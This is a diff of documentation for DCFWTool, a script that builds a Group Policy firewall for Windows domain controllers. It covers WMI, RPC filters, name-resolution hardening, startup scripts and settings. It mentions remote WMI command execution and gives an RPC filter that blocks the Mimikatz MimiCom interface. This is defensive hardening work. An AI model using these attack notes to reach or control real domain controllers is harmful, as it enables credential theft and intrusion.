-The [\[MS-WMI\]: Windows Management Instrumentation Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/c476597d-4c76-47e7-a2a4-a564fe4bf814) protocol is often used by administrators for remote system administration and monitoring:
+The [\[MS-WMI\]: Windows Management Instrumentation Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/c476597d-4c76-47e7-a2a4-a564fe4bf814)
+protocol is often used by administrators for remote system administration and monitoring:
 
 ```powershell
 (Get-WmiObject -ClassName Win32_OperatingSystem -ComputerName dc01 -Property Caption).Caption
@@ -783,17 +1078,25 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 DC01
 ```
 
-Although the output of the tool might suggest that WMI traffic can be tunnelled through SMB named pipes as well, it is fortunately not true and the WMI protocol can effectively be blocked using Windows Firewall. To further mitigate the threat of remote malicious command execution over WMI, it is recommended to turn on the following [Microsoft Defender Attack Surface Reduction (ASR)](https://learn.microsoft.com/en-us/defender-endpoint/overview-attack-surface-reduction) rules:
+Although the output of the tool might suggest that WMI traffic can be tunnelled through SMB named pipes as well,
+it is fortunately not true and the WMI protocol can effectively be blocked using Windows Firewall.
+To further mitigate the threat of remote malicious command execution over WMI,
+it is recommended to turn on the following [Microsoft Defender Attack Surface Reduction (ASR)](https://learn.microsoft.com/en-us/defender-endpoint/overview-attack-surface-reduction)
+rules:
 
 - [Block process creations originating from PSExec and WMI commands](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference#block-process-creations-originating-from-psexec-and-wmi-commands)
 - [Block persistence through WMI event subscription](https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference#block-persistence-through-wmi-event-subscription)
 
 > [!IMPORTANT]
-> System Center Configuration Manager (SCCM) agent will not work properly if these ASR rules are enabled.
+> System Center Configuration Manager (SCCM) client and Distribution Point (DP)
+> will not work properly if these ASR rules are enabled.
 
 #### Malicious C2 Protocols and Backdoors
 
-Some malicious tools can use the RPC protocol as a Command and Control (C2) channel. One such example is the infamous `Mimikatz` tool, which can be remotely controlled through the MimiCom interface with UUID [17FC11E9-C258-4B8D-8D07-2F4125156244](https://github.com/gentilkiwi/mimikatz/blob/master/mimicom.idl). One could of course block this interface using the following RPC filter:
+Some malicious tools can use the RPC protocol as a Command and Control (C2) channel.
+One such example is the infamous `Mimikatz` tool,
+which can be remotely controlled through the MimiCom interface with UUID [17FC11E9-C258-4B8D-8D07-2F4125156244](https://github.com/gentilkiwi/mimikatz/blob/master/mimicom.idl).
+One could of course block this interface using the following RPC filter:
 
 ```txt
 rpc filter
@@ -810,7 +1113,8 @@ The following protocols need to be investigated in the future, as they are open 
 
 - [\[MS-TSTS\]: Terminal Services Terminal Server Runtime Interface Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tsts/1eb45af1-94f1-4c42-9e13-dd0a018646fd)
 - [\[MS-RSP\]: Remote Shutdown Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rsp/6dfeb978-7a02-4826-b537-a1760fbf8074)
-- [\[MS-DCOM\]: Distributed Component Object Model (DCOM) Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0), specifically the ShellWindows, ShellBrowserWindow, and MMC20 objects.
+- [\[MS-DCOM\]: Distributed Component Object Model (DCOM) Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0),
+  specifically the ShellWindows, ShellBrowserWindow, and MMC20 objects.
 - [\[MS-RRP\]: Windows Remote Registry Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78)
 
 #### Additional Reading on RPC
@@ -819,69 +1123,1682 @@ The following protocols need to be investigated in the future, as they are open 
 - [A Definitive Guide to the Remote Procedure Call (RPC) Filter](https://www.akamai.com/blog/security/guide-rpc-filter#using)
 - [server22_rpc_servers_scrape.csv](https://github.com/akamai/akamai-security-research/blob/main/rpc_toolkit/rpc_interface_lists/server22_rpc_servers_scrape.csv)
 
-### Distribution Contents
+### IPSec Rules
+
+IPSec (Internet Protocol Security) provides means to ensure the confidentiality,
+integrity, and authenticity of data transmissions.
+The deployment of IPSec in transport mode therefore used to be an integral part of enterprise security baselines.
+However, this IPSec mode has turned out to be too complex to implement for the majority of organizations.
+Moreover, native encryption layers have been added to protocols like SMB, RDP, and RPC,
+making IPSec mostly redundant in Windows networks.
+
+One of the few exceptions is the DNS protocol, where not even the DNSSEC extension
+makes it immune to man-in-the-middle (MITM) attacks.
+And while Windows contains rich configuration options for securing DNS traffic in corporate networks using IPSec,
+the industry seems to have chosen DNS over HTTPS (DoH) to protect DNS traffic in public networks instead.
+We can only hope for the DoH support in Windows Server and access points with captive portals to improve in the near future,
+so that DoH can seamlessly be enforced on corporate devices.
+
+As a conclusion, most organizations should not even consider deploying IPSec in transport mode.
+They should rather focus on properly configuring the security measures that already available in application protocols,
+but are not enabled by default.
+
+### Name Resolution Protocols
+
+While the Domain Name System (DNS) is the primary protocol used for name resolution in Windows,
+the Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBNS)
+protocols are used as fallback. Support for Multicast DNS (mDNS) has been added in Windows 10.
+These 3 peer name resolution protocols are enabled by default and are often abused by malicious actors.
+By sending spoofed responses, they are able to redirect network traffic to their devices
+and perform MITM attacks against insecure network protocols like SMB or NTLM.
+It is therefore strongly recommended to disable the LLMNR, NBNS, and mDNS protocols,
+escpecially on sensitive systems like domain controllers.
+
+Disabling the LLMNR protocol is straightforward, as there is a built-in Group Policy setting available,
+located in Computer Configuration → Policies → Administrative Templates
+→ Network → DNS Client → **Turn off multicast name resolution**.
+This setting is catalogued in the [Windows security baseline](https://learn.microsoft.com/en-us/azure/governance/policy/samples/guest-configuration-baseline-windows)
+under ID *AZ-WIN-00145*. Contrary to its name, this setting has no effect on the mDNS protocol.
+
+If the mDNS protocol is to be disabled as well, this [undocumented registry setting](https://techcommunity.microsoft.com/t5/networking-blog/mdns-in-the-enterprise/ba-p/3275777)
+must be used:
+
+> HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DNSCache\\Parameters  
+> Registry value: EnableMDNS  
+> Value type: REG_DWORD  
+> Value data: 0
+
+To simplify the deployment of this setting,
+it has been added to the [DomainControllerFirewall.admx](#domaincontrollerfirewalladmx) custom template.
+
+The NBNS protocol is more complicated to deal with.
+Historically, it could only be disabled on a per-adapter basis.
+Startup scripts performing WMI calls are therefore often used by enterprises.
+Below is an example of such script:
+
+```powershell
+Get-WmiObject -Class Win32_NetworkAdapterConfiguration `
+              -Filter 'TcpipNetbiosOptions IS NOT NULL' |
+    Invoke-WmiMethod -Name SetTcpipNetbios -ArgumentList 2
+```
+
+The [SecGuide.admx](#secguideadmx) template,
+which is part of the [Security Compliance Toolkit (SCT)](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/security-compliance-toolkit-10),
+contains a similar setting called [NetBT NodeType configuration](https://www.betaarchive.com/wiki/index.php/Microsoft_KB_Archive/160177)
+and its recommended value is **P-Node**. Below is the corresponding registry setting:
+
+> HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Netbt\\Parameters
+> Registry value: NodeType  
+> Value type: REG_DWORD  
+> Value data: 2
+
+Since Windows 11, there is yet another NBNS-related Group Policy setting available,
+but it does not seem to actually work.
+It is located under Computer Configuration → Policies → Administrative Templates
+→ Network → DNS Client → **Configure NetBIOS settings**. This is the corresponding registry setting:
+
+> HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient
+> Registry value: EnableNetbios  
+> Value type: REG_DWORD  
+> Value data: 0
+
+## DCFWTool Distribution Contents
 
 Below is a list of all files that are part of the solution, with their respective paths and brief descriptions.
 
-- `GPOReport.html`
+`DCFWTool\Set-ADDSFirewallPolicy.ps1`
 
-   Sample Group Policy HTML report with all GPO settings configured by the tool
-- `inbound-builtin-firewall-rules.csv`
+:   PowerShell script for deploying the DC Firewall GPO.
 
-   List of all built-in FW rules utilized (not necessarily enabled) by the tool
-- `inbound-custom-firewall-rules.csv`
+`DCFWTool\Set-ADDSFirewallPolicy.Starter.json`
 
-   List of all custom FW rules utilized by the tool
-- `DCFWTool\Set-ADDSFirewallPolicy.ps1`
+:   Initial minimalistic configuration file that should be renamed
+    to `Set-ADDSFirewallPolicy.json` and edited before the `Set-ADDSFirewallPolicy.ps1` script is executed.
 
-   PowerShell script for deploying the DC Firewall GPO
-- `DCFWTool\Set-ADDSFirewallPolicy.Starter.json`
+`DCFWTool\Set-ADDSFirewallPolicy.Sample.json`
 
-   Initial minimalistic configuraton file that should be renamed to `Set-ADDSFirewallPolicy.json` and edited before the `Set-ADDSFirewallPolicy.ps1` script is executed
-- `DCFWTool\Set-ADDSFirewallPolicy.Sample.json`
+:   Sample configuration file containing all supported configurations options.
 
-   Sample configuration file containing all supported configurations options
-- `DCFWTool\Set-ADDSFirewallPolicy.schema.json`
+`DCFWTool\Set-ADDSFirewallPolicy.schema.json`
 
-   Schema file for the JSON configuration files
-- `DCFWTool\RpcNamedPipesFilters.txt`
+:   Schema file for the JSON configuration files.
 
-   `netsh.exe` script for creating RPC filters
-- `DCFWTool\PolicyDefinitions\DomainControllerFirewall.admx`
+`DCFWTool\RpcNamedPipesFilters.txt`
 
-   GPO template file for [custom configuration](#administrative-templates) settings
-- `DCFWTool\PolicyDefinitions\MSS-legacy.admx`
+:   `netsh.exe` script for creating RPC filters.
 
-   GPO template file for [MSS (Legacy)] settings
-- `DCFWTool\PolicyDefinitions\SecGuide.admx`
+`DCFWTool\PolicyDefinitions\DomainControllerFirewall.admx`
 
-   GPO template file for [MS Security Guide] settings
-- `DCFWTool\PolicyDefinitions\en-US\DomainControllerFirewall.adml`
+:   GPO template file for [custom configuration](#administrative-templates) settings.
 
-   English localization file for the `DomainControllerFirewall.admx` template
-- `DCFWTool\PolicyDefinitions\en-US\MSS-legacy.adml`
+`DCFWTool\PolicyDefinitions\MSS-legacy.admx`
 
-   English localization file for the `MSS-legacy.admx` template
-- `DCFWTool\PolicyDefinitions\en-US\SecGuide.adml`
+:   GPO template file for [MSS (Legacy)] settings.
 
-   English localization file for the `SecGuide.admx` template
+`DCFWTool\PolicyDefinitions\SecGuide.admx`
 
-- `DCFWTool\Show-WindowsFirewallLog.ps1`
+:   GPO template file for [MS Security Guide] settings.
 
-   PowerShell script for reading Windows Firewall log files.
+`DCFWTool\PolicyDefinitions\en-US\DomainControllerFirewall.adml`
+
+:   English localization file for the `DomainControllerFirewall.admx` template.
+
+`DCFWTool\PolicyDefinitions\en-US\MSS-legacy.adml`
+
+:   English localization file for the `MSS-legacy.admx` template.
+
+`DCFWTool\PolicyDefinitions\en-US\SecGuide.adml`
+
+:   English localization file for the `SecGuide.admx` template.
+
+`GPOReport.html`
+
+:   Sample Group Policy HTML report with all GPO settings configured by the tool.
+
+`inbound-builtin-firewall-rules.csv`
+
+:   List of all built-in FW rules utilized (not necessarily enabled) by the tool.
+
+`inbound-custom-firewall-rules.csv`
+
+:   List of all custom FW rules utilized by the tool.
+
+`additional-roles-firewall-rules.csv`
+
+:   List of built-in FW rules required by additional server roles supported by the tool.
+
+`DCFWTool\Show-WindowsFirewallLog.ps1`
+
+:   PowerShell script for reading Windows Firewall log files.
 
 [MSS (Legacy)]: https://techcommunity.microsoft.com/t5/microsoft-security-baselines/the-mss-settings/ba-p/701055
 [MS Security Guide]: https://learn.microsoft.com/en-us/deployoffice/security/security-baseline#ms-security-guide-administrative-template
 
-### Security Standards Compliance
+## Group Policy Object Contents
 
-#### Security Technical Implementation Guide (STIG)
+The Group Policy Object created and managed by the `DCFWTool` contains a lot of settings,
+including firewall rules, registry values, and a startup script.
+This chapter contains a detailed description of these configuration items.
 
-The [Security Technical Implementation Guide (STIG)](https://public.cyber.mil/stigs/) for Microsoft Windows Defender Firewall with Advanced Security was developed and [published](https://dl.dod.cyber.mil/wp-content/uploads/stigs/zip/U_MS_Windows_Defender_Firewall_V2R2_STIG.zip) by [Defense Information Systems Agency (DISA)](https://www.disa.mil/) as a tool to improve the security of [Department of Defense (DOD)](https://www.defense.gov/) information systems.
+![Managed GPO contents](../Images/Screenshots/gpo-contents.png)
 
-![](../Images/Logos/dod-disa-logo.jpg)
+### Windows Firewall Configuration
 
-Our firewall configuration is compliant with the majority of the STIG requirements out-of-the-box. The [configuration file](#configuration-file) can easily be modified to achieve full compliance. The following table of requirements corresponds to the Version 2, Release 2 of the STIG, published on November 9<sup>th</sup>, 2023.
+Based on the configured options in the [Set-ADDSFirewallPolicy.json configuration file](#configuration-file),
+the resulting GPO will contain the following Windows Firewall settings applied to all profiles:
+
+- Turn on the Windows Firewall
+- Block inbound connections by default
+- Disable local firewall rules
+- [Log dropped packets](#logdroppedpackets)
+- [Log allowed packets](#logallowedpackets)
+- [Log file location](#logfilepath)
+- [Maximum log file size](#logmaxsizekilobytes)
+- [Enable local IPSec rule merge](#enablelocalipsecrules)
+
+![GPO firewall configuration](../Images/Screenshots/gpo-firewall-config.png)
+
+A complete list of inbound firewall rules created by the tool is available in [the last chapter](#inbound-firewall-rules-reference).
+
+![GPO inbound firewall rules](../Images/Screenshots/gpo-firewall-inbound-rules.png)
+
+### Registry Settings
+
+Based on the configured options in the [Set-ADDSFirewallPolicy.json configuration file](#configuration-file),
+the GPO will contain a number of registry settings.
+Most of them are managed, which means that once the GPO is not linked to the target,
+the settings revert back to the default state.
+Some of them are [unmanaged](#dealing-with-gpo-tattooing) though
+and require attention when being reverted back to system defaults.
+
+![GPO registry settings](../Images/Screenshots/gpo-registry.png)
+
+The following registry-based network settings recommended by Microsoft are always configured:
+
+| Setting                                                                                                          | State    |
+|------------------------------------------------------------------------------------------------------------------|----------|
+| MSS: (EnableICMPRedirect) Allow ICMP redirects to override OSPF generated routes                                 | Disabled |
+| MSS: (DisableIPSourceRouting) IP source routing protection level (protects against packet spoofing)              | Enabled  |
+| MSS: (DisableIPSourceRouting IPv6) IP source routing protection level (protects against packet spoofing)         | Enabled  |
+| MSS: (PerformRouterDiscovery) Allow IRDP to detect and configure Default Gateway addresses (could lead to DoS)   | Disabled |
+| MSS: (NoNameReleaseOnDemand) Allow the computer to ignore NetBIOS name release requests except from WINS servers | Enabled  |
+
+Note that support for these settings is added by the [MSS Legacy](#mss-legacy-admx) administrative template.
+
+### Administrative Templates
+
+The following ADMX files and their respective English ADML files are copied
+to the [Central ADMX Store](https://learn.microsoft.com/en-us/troubleshoot/windows-client/group-policy/create-and-manage-central-store)
+if it exists:
+
+#### DomainControllerFirewall.admx
+
+This custom ADMX template enables configuration of the following settings:
+
+[NTDS Static Port](#ntdsstaticport)
+
+:   Computer Configuration → Administrative Templates → RPC Static Ports →
+    Domain Controller: Active Directory RPC static port
+
+[Netlogon Static Port](#netlogonstaticport)  
+
+:   Computer Configuration → Administrative Templates → RPC Static Ports →
+    Domain Controller: Netlogon static port
+
+[FRS Static Port](#frsstaticport)  
+
+:   Computer Configuration → Administrative Templates → RPC Static Ports →
+    Domain Controller: File Replication Service (FRS) static port
+
+[mDNS Configuration](#disablemdns)  
+
+:   Computer Configuration → Administrative Templates → Network → DNS Client →
+    Turn off Multicast DNS (mDNS) client
+
+#### SecGuide.admx
+
+This template is provided by Microsoft as part of the [Security Compliance Toolkit](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/security-compliance-toolkit-10).
+
+The corresponding settings can be found under Computer Configuration → Administrative Templates → MS Security Guide.
+
+#### MSS-legacy.admx {#mss-legacy-admx}
+
+The [MSS (Legacy) template](https://techcommunity.microsoft.com/blog/microsoft-security-baselines/the-mss-settings/701055)
+is provided by Microsoft as part of the [Security Compliance Toolkit](https://learn.microsoft.com/en-us/windows/security/operating-system-security/device-management/windows-security-configuration-framework/security-compliance-toolkit-10).
+
+The corresponding settings can be found under Computer Configuration → Administrative Templates → MSS (Legacy).
+
+### Startup Script
+
+The managed GPO also contains a startup script called `FirewallConfiguration.bat`,
+which is used to configure some firewall-related settings
+that cannot be deployed through declarative Group Policy extensions.
+The script is automatically generated based on the configuration defined
+in the [Set-ADDSFirewallPolicy.json](#configuration-file)
+and it may execute the following actions:
+
+- Configure a fixed port for Windows Management Instrumentation (WMI).
+- Install DFS Management tools, if not already present on the machine.
+- Set up a static port for the Distributed File System Replication (DFSR).
+- Create a firewall log file and set appropriate permissions on it.
+- Register remote procedure call (RPC) filters.
+
+The batch file format is intentionally used instead of a Powershell script to avoid potential issues with execution policy.
+
+![Autogenerated Group Policy startup script](../Images/Screenshots/deploy-gpo-startup-script.png)
+
+> [!WARNING]
+> As startup scripts depend on [foreground GPO processing](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj573586(v=ws.11)),
+> target servers need to be restarted at least once for these settings to get applied.
+> Some workarounds are discussed in the chapter on [System Reboots](#system-reboots).
+
+#### WMI Static Port
+
+Depending on the [WmiStaticPort](#wmistaticport) setting, the startup script will reconfigure
+the WMI service to run in a standalone process listening on TCP port 24158
+with authentication level set to `RPC_C_AUTHN_LEVEL_PKT_PRIVACY`.
+This is achieved by executing the following command:
+
+```bat
+winmgmt.exe /standalonehost 6
+```
+
+#### DFSR Static Port
+
+Depending on the [DfsrStaticPort](#dfsrstaticport) setting,
+the startup script will ensure that the optional DFS Management tools are installed:
+
+```bat
+if not exist "%SystemRoot%\system32\dfsrdiag.exe" (
+  dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
+)
+```
+
+Next, it will configure the DFSR to use a static port:
+
+```bat
+dfsrdiag.exe StaticRPC /Port:5722
+```
+
+#### Firewall Log File
+
+Due to a known bug in Windows, it is not enough to enable dropped packet logging
+through the Windows Firewall settings dialog window.
+
+![Firewall log file configuration](../Images/Screenshots/firewall-log-config.png){ width=400px }
+
+The log file needs to be created manually
+and write permissions must be granted to the firewall service.
+The startup script takes care of this additional step by executing the command line below:
+
+```bat
+netsh.exe advfirewall set allprofiles logging filename "%systemroot%\system32\logfiles\firewall\pfirewall.log"
+```
+
+The optional [LogFilePath](#logfilepath) setting can be used if the default log path is undesirable.
+
+#### RPC Filters Script
+
+If the [EnableRpcFilters](#enablerpcfilters) setting is configured,
+the startup script will register all RPC filters defined in the `RpcNamedPipesFilters.txt` file
+by running the following command:
+
+```bat
+netsh.exe -f "%~dp0RpcNamedPipesFilters.txt"
+```
+
+The `RpcNamedPipesFilters.txt` file will be located in the `Startup` directory of the GPO:
+
+![RPC Filters configuration file](../Images/Screenshots/deploy-rpcnamedpipesfilter.png)
+
+### NPS Fix for Downlevel Windows Servers
+
+Due to a known bug in downlevel Windows versions,
+Windows Server 2022 firewall rules related to the Network Policy Server (NPS)
+do not work in Windows Server 2019 and 2016.
+
+If the presence of Network Policy Server is indicated using the [EnableNPS](#enablenps) setting,
+the startup script will contain
+a [simple fix](https://learn.microsoft.com/en-us/answers/questions/97643/windows-server-2019-nps-(network-policy-server)-so)
+for this issue:
+
+```bat
+sc.exe sidtype IAS unrestricted
+```
+
+The command enables the NPS service to be targeted by firewall rules.
+
+#### Sample Startup Scripts
+
+Here is an example of a full startup script generated by the `DCFWTool`:
+
+```shell
+@ECHO OFF
+REM This script is managed by the Set-ADDSFirewallPolicy.ps1 PowerShell script.
+
+echo Move the WMI service to a standalone process listening on TCP port 24158 with authentication level set to RPC_C_AUTHN_LEVEL_PKT_PRIVACY.
+winmgmt.exe /standalonehost 6
+
+echo Install the dfsrdiag.exe tool if absent.
+if not exist "%SystemRoot%\system32\dfsrdiag.exe" (
+    dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
+)
+
+echo Set static RPC port for DFS Replication.
+dfsrdiag.exe StaticRPC /Port:5722
+
+echo Create the firewall log file and configure its DACL.
+netsh.exe advfirewall set allprofiles logging filename "%systemroot%\system32\logfiles\firewall\pfirewall.log"
+
+echo Register the RPC filters.
+netsh.exe -f "%~dp0RpcNamedPipesFilters.txt"
+
+echo Fix the NPS service to work with Windows Firewall on downlevel Windows Server versions.
+sc.exe sidtype IAS unrestricted
+```
+
+And here is a script applying inverted settings:
+
+```shell
+@ECHO OFF
+REM This script is managed by the Set-ADDSFirewallPolicy.ps1 PowerShell script.
+
+echo Move the WMI service into the shared Svchost process.
+winmgmt.exe /sharedhost
+
+echo Install the dfsrdiag.exe tool if absent.
+if not exist "%SystemRoot%\system32\dfsrdiag.exe" (
+    dism.exe /Online /Enable-Feature /FeatureName:DfsMgmt
+)
+
+echo Set dynamic RPC port for DFS Replication.
+dfsrdiag.exe StaticRPC /Port:0
+
+echo Create the firewall log file and configure its DACL.
+netsh.exe advfirewall set allprofiles logging filename "%systemroot%\system32\logfiles\firewall\pfirewall.log"
+
+echo Remove all RPC filters.
+netsh.exe rpc filter delete filter filterkey=all
+```
+
+## Configuration
+
+### Configuration File
+
+The `Set-ADDSFirewallPolicy.ps1` script expects a configuration file
+called `Set-ADDSFirewallPolicy.json` to be present in the same directory.
+To prevent accidental execution of the script with default settings,
+the configuration file does not exist by default and needs to be created manually before deployment.
+
+To simplify the task of creation of a custom configuration file, the `DCFWTool` comes with 2 sample files:
+
+- `Set-ADDSFirewallPolicy.Starter.json`
+
+   Contains only the minimum settings required for firewall policy deployment.
+   It is recommended to rename the file to `Set-ADDSFirewallPolicy.json` and to add any additional customizations
+   of the policy object to be deployed.
+
+- `Set-ADDSFirewallPolicy.Sample.json`
+
+    Contains all the possible configuration items with sample values.
+    It is essential to thoroughly review and adjust all the settings. This sample file should never be used "AS IS".
+
+> [!CAUTION]
+> Improper configuration can cause network outages in your environment!
+
+Here is a sample configuration file containing all the possible settings:
+
+```json
+{
+  "$schema": "Set-ADDSFirewallPolicy.schema.json",
+  "GroupPolicyObjectName": "Domain Controller Firewall",
+  "TargetDomain": "contoso.com",
+  "GroupPolicyObjectComment": "This GPO is managed by the Set-ADDSFirewallPolicy.ps1 PowerShell script.",
+  "LogDroppedPackets": true,
+  "LogAllowedPackets": false,
+  "LogFilePath": "%systemroot%\\system32\\logfiles\\firewall\\pfirewall.log",
+  "LogMaxSizeKilobytes": 16384,
+  "ClientAddresses": [ "203.0.113.0/24", "198.51.100.0/24" ],
+  "ManagementAddresses": [ "198.51.100.0/24" ],
+  "DomainControllerAddresses": [ "192.0.2.0/24" ],
+  "RadiusClientAddresses": $null,
+  "NtdsStaticPort": 38901,
+  "NetlogonStaticPort": 38902,
+  "FrsStaticPort": 38903,
+  "DfsrStaticPort": 5722,
+  "WmiStaticPort": true,
+  "DisableNetbiosBroadcasts": true,
+  "DisableLLMNR": true,
+  "DisableMDNS": true,
+  "BlockManagementFromDomainControllers": false,
+  "EnableServiceManagement": true,
+  "EnableEventLogManagement": true,
+  "EnableScheduledTaskManagement": true,
+  "EnableWindowsRemoteManagement": true,
+  "EnablePerformanceLogAccess": true,
+  "EnableOpenSSHServer": false,
+  "EnableRemoteDesktop": true,
+  "EnableDiskManagement": true,
+  "EnableBackupManagement": true,
+  "EnableFirewallManagement": false,
+  "EnableComPlusManagement": false,
+  "EnableLegacyFileReplication": false,
+  "EnableNetbiosNameService": false,
+  "EnableNetbiosDatagramService": false,
+  "EnableNetbiosSessionService": false,
+  "EnableWINS": false,
+  "EnableDhcpServer": false,
+  "EnableNPS": false,
+  "EnableKMS": false,
+  "EnableWSUS": false,
+  "EnableWDS": false,
+  "EnableWebServer": false,
+  "EnablePrintSpooler": false,
+  "EnableFSRMManagement": false,
+  "EnableNetworkProtection": true,
+  "BlockWmiCommandExecution": true,
+  "EnableRpcFilters": true,
+  "EnableLocalIPsecRules": false,
+  "CustomRuleFileNames": [
+      "CustomRules.BackupAgent.ps1",
+      "CustomRules.ManagementAgent.ps1"
+   ]
+}
+```
+
+To further simplify the modification of configuration files,
+the solution contains a JSON schema file called `Set-ADDSFirewallPolicy.schema.json`,
+which provides code completion support to modern IDEs like [VS Code](https://code.visualstudio.com/):
+
+![Visual Studio Code support](../Images/Screenshots/settings-intellisense.png)
+
+### Dealing with GPO Tattooing
+
+Some firewall-related settings are not removed from the domain controllers after they fall out of scope of the GPO.
+These changes are thus permanent and require manual removal.
+Such settings are called **unmanaged** and the resulting behavior is known as GPO tattooing.
+To address this issue, the `DCFWTool` configuration files use ternary logic:
+
+- `true` ⇒ The setting is enabled by the GPO.
+- `false` ⇒ The setting is disabled by the GPO.
+- `null` ⇒ The local setting is not changed by the GPO.
+
+As a consequence, before the value of an unmanaged setting can be changed from `true` to `null`,
+it must temporarily be set to `false`.
+Keep in mind that it may take time for the new settings to propagate to all domain controllers due to replication latency.
+Additionally, some settings [may require a reboot](#system-reboots).
+
+The following settings in this project are known to cause tattooing:
+
+- [NtdsStaticPort](#ntdsstaticport)
+- [NetlogonStaticPort](#netlogonstaticport)
+- [FrsStaticPort](#frsstaticport)
+- [DfsrStaticPort](#dfsrstaticport)
+- [WmiStaticPort](#wmistaticport)
+- [DisableNetbiosBroadcasts](#disablenetbiosbroadcasts)
+- [DisableMDNS](#disablemdns)
+- [EnableRpcFilters](#enablerpcfilters)
+
+All settings in the [MSS Legacy](#registry-settings) administrative template are unmanaged as well.
+
+The remainder of this chapter contains documentation to all the settings supported by the `DCFWTool`.
+
+### GroupPolicyObjectName
+
+The name of the Group Policy Object (GPO) that will be created or updated.
+
+```yaml
+Type: String
+Required: true
+Default value: "Domain Controller Firewall"
+```
+
+Feel free to change it so that it complies with your naming convention.
+
+### GroupPolicyObjectComment
+
+The comment text that will be visible on the GPO object.
+
+```yaml
+Type: String
+Required: false
+Default value: "This GPO is managed by the Set-ADDSFirewallPolicy.ps1 PowerShell script."
+```
+
+### TargetDomain
+
+FQDN of the domain in which the Group Policy Object (GPO) will be created or updated.
+
+```yaml
+Type: String
+Required: false
+Default value: null
+```
+
+This setting is only useful in multi-domain forests.
+If not specified, the script will attempt to determine the domain of the local computer.
+
+### LogDroppedPackets
+
+Indicates whether the packets dropped by the firewall should be logged.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: false
+Recommended value: true
+Possible values: true / false
+```
+
+If `true`, all dropped packets will be logged into the [firewall text log](#logfilepath).
+
+If `false`, dropped packets will not be logged.
+
+### LogAllowedPackets
+
+Indicates whether the packets allowed by the firewall should be logged.
+
+```yaml
+Type: Boolean
+Required: false
+Default value: false
+Recommended value: false
+Possible values: true / false
+```
+
+If `true`, all allowed packets will be logged into the [firewall text log](#logfilepath).
+
+If `false`, allowed packets will not be logged.
+
+### LogFilePath
+
+Specifies the path to the log file that will be used to store information about
+the allowed and/or dropped packets if [logging is enabled](#logdroppedpackets).
+
+```yaml
+Type: String
+Required: false
+Default value: %systemroot%\\system32\\logfiles\\firewall\\pfirewall.log
+```
+
+The provided value will be used by the [startup script](#firewall-log-file) to configure the log.
+
+As all 3 profiles (Domain/Private/Public) are configured identically,
+a shared log file is created for all of them.
+This is to allow easier search, troubleshooting, and ingestion by log collectors.
+
+### LogMaxSizeKilobytes
+
+Sets the maximum size of the [firewall log](#logfilepath) in kilobytes (KB).
+
+```yaml
+Type: Integer
+Required: false
+Default value: 128
+Recommended value: 16384
+Possible values: 1 - 32767
+```
+
+The file won't grow beyond this size; when the limit is reached,
+old log entries are deleted to make room for the newly created ones.
+
+To be compliant with security standards like STIG or CIS, set this value to **at least 16384**.
+
+### ClientAddresses
+
+List of client IP adresses from which inbound traffic should be allowed.
+
+```yaml
+Type: String[]
+Required: false
+Default value: [ "Any" ]
+```
+
+Possible values: IPv4 address, IPv4 subnet or IPv4 address range, separated by a comma,
+e.g., "10.220.2.0/24", "10.220.4.0/24", "10.220.5.0/24", "192.168.0.1-192.168.0.10".
+Supports also "Any" as an input.
+
+Specify IPv4 address, IPv4 subnet or address range of all your clients.
+Anything what acts as a client from a DC perspective is considered client here,
+so you should specify all your server and user/client subnets.
+Everything that needs to interact with your DCs should be included here,
+except for other DCs and secure endpoints (PAWs) used to manage Domain Controllers or Tier 0 in general.
+
+> [!WARNING]
+> This is a critical configuration setting! With improper configuration,
+> this could cause network outage for your clients.
+
+### ManagementAddresses
+
+List of IP addresses from which inbound management traffic should be allowed.
+
+```yaml
+Type: String[]
+Required: false
+Default value: [ "Any" ]
+```
+
+Possible values: IPv4 address, IPv4 subnet or IPv4 address range, separated by a comma,
+e.g., "10.220.2.0/24", "10.220.4.0/24", "10.220.5.0/24", "192.168.0.1-192.168.0.10".
+
+Specify IPv4 address, IPv4 subnet or address range of all secure endpoints (PAWs)
+used to manage Domain Controllers or Tier 0 in general.
+
+> [!WARNING]
+> This is a critical configuration setting! With improper configuration,
+> this could cause network outage for your management workstations.
+
+### DomainControllerAddresses
+
+List of domain controller IP addresses, between which replication and management traffic will be allowed.
+
+```yaml
+Type: String[]
+Required: false
+Default value: [ "Any" ]
+```
+
+Possible values: IPv4 address, IPv4 subnet or IPv4 address range, separated by a comma,
+e.g., "10.220.2.0/24", "10.220.4.0/24", "10.220.5.0/24", "192.168.0.1-192.168.0.10".
+
+Specify IPv4 address, IPv4 subnet or address range of all your Domain Controllers in the forest.
+
+> [!WARNING]
+> This is a critical configuration setting! With improper configuration, this could cause network outage for your DCs.
+
+### NtdsStaticPort
+
+Static TCP port to be used for inbound Active Directory RPC traffic.
+
+```yaml
+Type: Integer
+Default value: null
+Recommended value: 38901
+Possible values: null / 0 / 1024 - 49151
+```
+
+If a `non-zero value` is provided for this setting,
+the Active Directory (NTDS) service will be listening on this [static TCP port](#static-rpc-ports).
+
+If set to `0 (zero)`, a dynamic TCP port in the 49152 – 65535 range will be used by the NTDS service,
+which is the default behavior.
+
